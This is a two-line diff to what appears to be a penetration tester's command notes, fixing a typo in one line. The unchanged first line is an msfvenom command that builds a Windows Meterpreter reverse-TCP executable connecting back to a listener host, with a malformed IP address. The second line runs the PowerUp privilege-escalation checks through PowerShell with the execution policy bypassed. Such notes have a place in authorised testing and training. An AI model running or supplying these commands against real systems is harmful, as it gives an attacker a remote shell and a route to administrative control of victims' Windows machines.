@@ -1,2 +1,2 @@
 msfvenom -p windows/meterpreter/reverse_tcp --platform windows -a x86 -f exe LHOST=192.1682.90 LPORT=444 -o /root/Desktop/Test.exe
-powershell -ExecutionPolicy Bypass -Command". .\PowerUp.ps1;lnvoke-AllChecks"
+powershell -ExecutionPolicy Bypass -Command ". .\PowerUp.ps1;Invoke-AllChecks"
